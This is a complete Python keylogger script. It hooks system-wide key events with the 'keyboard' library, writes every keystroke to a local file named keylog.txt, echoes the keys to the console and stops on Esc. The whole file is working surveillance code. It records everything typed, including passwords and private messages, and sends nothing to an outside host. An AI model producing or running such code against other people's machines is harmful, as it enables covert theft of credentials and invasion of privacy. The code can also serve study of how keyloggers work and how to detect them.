
import keyboard
import os

# Path to the log file
log_file = "keylog.txt"

# Function to write keystrokes to the log file
def write_to_log(key):
    try:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(key)
    except Exception as e:
        print(f"\n[ERROR] Failed to write to log: {e}")

# Function to handle key events
def on_key_event(e):
    key = e.name
    if len(key) > 1:
        # Special keys (e.g., 'enter', 'space', etc.)
        if key == "space":
            key = " "
        elif key == "enter":
            key = "\n"
        elif key == "decimal":
            key = "."
        else:
            key = f"[{key}]"
    write_to_log(key)
    print(key, end='', flush=True)  # Print to console without newline

# Main function to start the keylogger
def main():
    print("Keylogger started. Press 'Esc' to exit.")
    try:
        # Start listening to keyboard events
        keyboard.on_release(on_key_event)
        keyboard.wait("esc")
    except Exception as e:
        print(f"[ERROR] {e}")
    finally:
        print("\nKeylogger stopped.")

if __name__ == "__main__":
    main()
